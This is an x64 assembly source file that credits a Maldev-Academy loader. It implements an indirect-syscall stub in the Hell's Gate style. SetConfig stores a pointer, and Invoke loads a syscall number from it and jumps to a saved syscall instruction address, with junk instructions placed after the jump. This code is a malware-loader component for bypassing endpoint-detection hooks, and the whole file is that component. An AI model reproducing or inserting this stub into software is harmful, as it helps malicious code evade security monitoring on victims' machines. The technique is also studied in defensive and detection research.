[BITS 64]

DEFAULT REL
GLOBAL ___chkstk_ms
GLOBAL SetConfig
GLOBAL Invoke

[SECTION .text$B]
    ___chkstk_ms:
        ret

    SetConfig:
        mov r11, rcx
    ret

    ; this version is from https://github.com/Maldev-Academy/MaldevAcademyLdr.1/blob/main/Loader/HellsAsm.asm
    Invoke:
		xor r10, r10					; r10 = 0
		mov rax, rcx					; rax = rcx
		mov r10, rax					; r10 = rax = rcx
		mov eax, [r11 + 0x8]				; eax = ssn
		jmp Run						; execute 'Run'
		xor eax, eax					; wont run
		xor rcx, rcx					; wont run
		shl r10, 2					; wont run
	Run:
		jmp qword [r11]
		xor r10, r10					; r10 = 0
		mov [r11 + 0x8], r10			; qSyscallInsAdress = 0
		ret
